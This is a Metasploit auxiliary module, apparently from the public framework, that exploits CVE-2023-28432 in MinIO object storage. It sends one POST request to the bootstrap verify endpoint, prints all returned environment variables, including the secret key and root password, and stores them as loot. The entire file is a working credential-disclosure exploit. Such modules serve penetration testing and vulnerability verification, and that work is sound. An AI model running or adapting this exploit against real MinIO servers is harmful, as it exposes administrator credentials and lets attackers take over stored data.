##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MinIO Bootstrap Verify Information Disclosure',
        'Description' => %q{
          MinIO is a Multi-Cloud Object Storage framework. In a cluster deployment starting with
          RELEASE.2019-12-17T23-16-33Z and prior to RELEASE.2023-03-20T20-16-18Z, MinIO returns
          all environment variables, including `MINIO_SECRET_KEY` and `MINIO_ROOT_PASSWORD`,
          resulting in information disclosure.

          Verified against MinIO 2023-02-27T18:10:45Z
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'joel @ ndepthsecurity', # msf module
          'RicterZ' # original PoC, analysis
        ],
        'References' => [
          [ 'URL', 'https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q'],
          [ 'CVE', '2023-28432']
        ],
        'Targets' => [
          [ 'Automatic Target', {}]
        ],
        'DisclosureDate' => '2023-03-20',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
    register_options(
      [
        Opt::RPORT(9000),
        OptString.new('TARGETURI', [ true, 'The URI of the MinIO Application', '/'])
      ]
    )
  end

  def run
    vprint_status('Sending Request')
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'minio/bootstrap/v1/verify'),
      'method' => 'POST'
    )
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected Response (response code: #{res.code})") unless res.code == 200

    json = res.get_json_document
    json['MinioEnv'].each do |key, value|
      print_good("#{key}: #{value}")
    end

    path = store_loot('minio.env.json', 'application/json', rhost, json, 'minio.env.json', 'MinIO Environmental Variables Json')
    print_good("MinIO Environmental Variables Json Saved to: #{path}")
  end
end
